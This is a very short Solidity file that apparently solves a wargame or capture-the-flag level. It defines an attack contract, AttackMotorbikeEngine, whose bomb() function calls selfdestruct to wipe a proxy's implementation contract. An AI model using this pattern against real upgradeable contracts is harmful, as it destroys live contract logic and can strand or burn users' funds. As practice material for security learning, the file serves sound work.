// SPDX-License-Identifier: MIT
pragma solidity <0.7.0;

contract AttackMotorbikeEngine {
    function bomb() public {
        selfdestruct(address(0));
    }
}